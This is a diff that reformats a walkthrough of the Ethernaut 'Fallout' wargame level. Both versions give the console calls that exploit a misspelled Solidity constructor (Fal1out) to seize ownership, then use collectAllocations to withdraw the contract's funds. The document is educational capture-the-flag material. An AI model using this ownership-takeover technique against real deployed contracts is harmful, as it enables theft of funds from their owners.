@@ -1,112 +1,93 @@
-# Fallout – Level 2 Walkthrough
+# Fallout
 
-Welcome to the second level of the **Ethernaut** wargame by [OpenZeppelin](https://ethernaut.openzeppelin.com/), focused on smart contract constructor vulnerabilities.
+## Objective
 
----
-
-## Challenge Objective
-
-You are given a contract with a misnamed constructor. Your goal is to:
-
-- Exploit the typo to become the contract owner
-- (Optionally) withdraw any contract balance
-- Submit the instance to complete the level
-
----
-
-## Prerequisites
-
-Before you begin, ensure the following:
-
-- **MetaMask** is installed and connected
-- **Test ETH** is available (Goerli, Sepolia, etc.)
-- Familiarity with using **browser DevTools** and executing JavaScript commands
-- Access to the [Ethernaut Game](https://ethernaut.openzeppelin.com/)
+Exploit a smart contract with a misnamed constructor to become the owner and (optionally) withdraw its balance.
 
 ---
 
 ## Getting Started
 
-### 1. **Load the Level**
+1. Go to [ethernaut.openzeppelin.com](https://ethernaut.openzeppelin.com/)
+2. Select the **"Fallout"** level
+3. Click **“Get new instance”** and approve the transaction in MetaMask
+4. The instance is now deployed and available as the `contract` object in the browser console
+5. Save the instance address:
 
-- Navigate to [ethernaut.openzeppelin.com](https://ethernaut.openzeppelin.com/)
-- Select **"Fallout"** from the list of levels
-- Click **"Get new instance"**
-- Approve the MetaMask transaction to deploy your personalized challenge contract
-
-Once the contract is deployed, it will inject a global object called `contract` into your browser console.
+    ```js
+    contract.address
+    ```
 
 ---
 
-## Walkthrough – Step by Step
+## Walkthrough
 
-### 🗒️ Step 1: Check the Current Owner
+### Step 1: Check the Current Owner
 
 ```js
 await contract.owner()
 ```
-> The owner is likely the zero address or uninitialized.
+
+**Explanation:**
+This checks the current owner of the contract. Initially, it is likely uninitialized or set to the zero address due to the constructor typo.
 
 ---
 
-### 🛠️ Step 2: Call the Misnamed Constructor
+### Step 2: Call the Misnamed Constructor
 
 ```js
 await contract.Fal1out({ value: "1" })
 ```
-> This function is public due to a typo (`Fal1out` instead of `Fallout`). Calling it sets you as the owner.
+
+**Explanation:**
+The constructor was misspelled as `Fal1out`, making it a public function. Calling it allows you to become the contract owner.
 
 ---
 
-### 🔍 Step 3: Confirm Ownership
+### Step 3: Confirm Ownership
 
 ```js
 await contract.owner()
 ```
-> The owner should now be your address.
+
+**Explanation:**
+Verifies that you are now the owner after calling the misnamed constructor.
 
 ---
 
-### 💸 Step 4: (Optional) Withdraw Allocations
-
-If the contract holds ETH, you can withdraw it:
+### Step 4: (Optional) Withdraw Allocations
 
 ```js
 await contract.collectAllocations()
 ```
-> Only the owner can call this function.
+
+**Explanation:**
+If the contract holds ETH, only the owner can withdraw it using this function.
 
 ---
 
-### ✅ Step 5: Submit the Level
+### Step 5: Submit the Level
 
-Click **“Submit instance”** in the UI and confirm the MetaMask transaction. Once successful, the level is marked as **completed**.
-
----
-
-## 💡 What You Learn
-
-- The importance of correct constructor naming in Solidity <0.7.0
-- How typos can introduce critical vulnerabilities
-- How to claim ownership by exploiting public functions
-- The evolution to the `constructor` keyword in newer Solidity versions
+Submit the instance in the Ethernaut UI and confirm the transaction in MetaMask to complete the level.
 
 ---
 
-## Concepts Covered
+## What You Learn
 
-| Concept             | Description                                                                  |
-| ------------------- | ---------------------------------------------------------------------------- |
-| Constructor Typos   | Misnamed constructors are public functions, not constructors                 |
-| Ownership Takeover  | Anyone can become owner by calling the typo’d function                      |
-| Withdrawal Patterns | Only the owner can withdraw contract funds                                   |
-| Web3 Interaction    | Using injected contract instances and console JS to interact                 |
+This level teaches the following:
+
+* The importance of correct constructor naming in Solidity versions before 0.7.0
+* How typos in function names can introduce critical vulnerabilities
+* How to exploit public functions to claim contract ownership
+* The evolution to the `constructor` keyword in newer Solidity versions
 
 ---
 
-## Resources
+## Resources Used
 
-- [Ethernaut Game](https://ethernaut.openzeppelin.com/)
-- [YouTube Walkthrough](https://www.youtube.com/watch?v=1E0BTVudurM)
-- [blog](https://shubhamm.me/blog/09q-ethernaut-challenges-fallout)
+* [Ethernaut Game](https://ethernaut.openzeppelin.com/)
+* [Solidity Docs](https://docs.soliditylang.org/)
+* [YouTube Walkthrough](https://www.youtube.com/watch?v=1E0BTVudurM)
+* [Blog Writeup](https://shubhamm.me/blog/09q-ethernaut-challenges-fallout)
+
 ---
